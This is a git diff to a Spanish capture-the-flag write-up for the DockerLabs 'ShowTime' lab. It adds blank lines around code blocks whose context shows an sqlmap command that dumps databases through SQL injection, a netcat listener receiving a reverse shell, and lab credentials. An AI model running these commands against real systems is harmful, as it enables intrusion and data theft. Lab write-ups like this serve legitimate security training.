@@ -120,6 +120,7 @@ Y por último usando **SQLMap**, automatizaremos la explotación de SQL Injectio
 - **-r burp.txt**: especificamos el archivo que alberga la petición que SQLMap usará para ejecutar sus injecciones.
 - **-dbs**: sirve para enumerar las bases de datos encontradas.
 - **--dump**: esta función muestra el vuelco de la información encontrada en las tablas.
+
 ```bash
 ┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/content]
 └─$ sqlmap -r burp.txt -dbs --dump 
@@ -161,6 +162,7 @@ Las credenciales correctas son el usuario **joe** y la password **MiClaveEsInhac
 ![Reverse Shell](/assets/post_img/ShowTime/4-PY-REVSH.png)
 
 Desde Kali, recibimos la Reverse Shell obteniendo así el control del usuario **www-data**. Lo siguiente es retomar la metodología tratando la **TTY**:
+
 ```bash                                                                  
 ┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/deploy]
 └─$ sudo nc -lvnp 9001
